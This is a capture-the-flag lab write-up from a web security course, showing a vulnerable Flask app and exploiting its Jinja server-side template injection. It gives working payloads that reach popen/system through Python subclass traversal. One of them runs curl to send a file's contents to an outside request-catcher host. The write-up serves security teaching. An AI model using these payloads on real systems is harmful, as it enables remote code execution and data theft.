---
title: Simple Web 0x15(Lab - `Jinja`)
tags: [NTUSTWS, CTF, Web]

category: "Security｜Course｜NTUST WS｜SSTI"
date: 2023-12-08
---

# Simple Web 0x15(Lab - `Jinja`)
<!-- more -->
###### tags: `NTUSTWS` `CTF` `Web`
Challenge: http://h4ck3r.quest:8700/

## Background
[Web Security 0x1](https://youtu.be/_hasOTGximc?t=5863)

## Source code
:::spoiler code
```python=
from flask import Flask, render_template_string, request, send_file

app = Flask(__name__)


@app.get("/")
def home():
    return render_template_string("""
    <form method="POST">
        <input type="text" name="name" placeholder="Your name">
        <button>submit</button>
    </form>
    <p><a href="/source">Source code</a></p>
    """)


@app.post("/")
def welcome_message():
    name = request.form.get('name')
    return render_template_string("<p>Hello, " + name + "</p>")


@app.get("/source")
def source():
    return send_file(__file__, mimetype="text/plain")


if __name__ == '__main__':
    app.run(threaded=True, debug=True)
```
:::

## Exploit

### Easy way
{% raw %}
payload: `{{[].__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']("cat /th1s_15_fl4ggggggg").read()}}`
{% endraw %}
![](https://i.imgur.com/dRLbk0J.png)

### Need Tool way - [Beeceptor](https://beeceptor.com/)
`Beeceptor` will catch our result from `curl`. 
<font color="FF0000">It'll execute `cat /th1s_15_fl4ggggggg` first and the result will be sent to `Beeceptor` as attached data by `curl`.</font>
Payload: 
{% raw %}
```!
{{[].__class__.__base__.__subclasses__()[132].__init__.__globals__['system']('curl {Beeceptor URL} -d "`cat /th1s_15_fl4ggggggg`"')}}
```
{% endraw %}
![](https://i.imgur.com/PQ39MMI.png)

Flag: `FLAG{ssti.__class__.__pwn__}`